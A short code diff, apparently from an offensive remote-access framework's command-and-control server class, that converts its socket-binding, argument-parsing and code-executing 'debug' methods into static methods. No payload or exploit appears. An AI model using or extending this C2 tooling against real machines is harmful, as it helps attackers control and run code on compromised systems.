@@ -390,7 +390,8 @@ class C2():
                 util.display('\x20' * 4, end=' ')
                 util.display(str(info), color=self._text_color, style=self._text_style)
 
-    def _socket(self, port):
+    @staticmethod
+    def _socket(port):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.bind(('0.0.0.0', port))
@@ -411,7 +412,8 @@ class C2():
             util.display("Hint: show usage information with the 'help' command\n", color='white', style='normal')
         return __banner__
 
-    def _get_arguments(self, data):
+    @staticmethod
+    def _get_arguments(data):
         args = tuple([i.strip('-') for i in str(data).split() if '=' not in i])
         kwds = dict({i.partition('=')[0].strip('-'): i.partition('=')[2].strip('-') for i in str(data).split() if '=' in i})
         return collections.namedtuple('Arguments', ('args','kwargs'))(args, kwds)
@@ -472,7 +474,8 @@ class C2():
             return "File '{}' not found".format(str(path))
 
 
-    def debug(self, code):
+    @staticmethod
+    def debug(code):
         """
         Execute code directly in the context of the currently running process
 
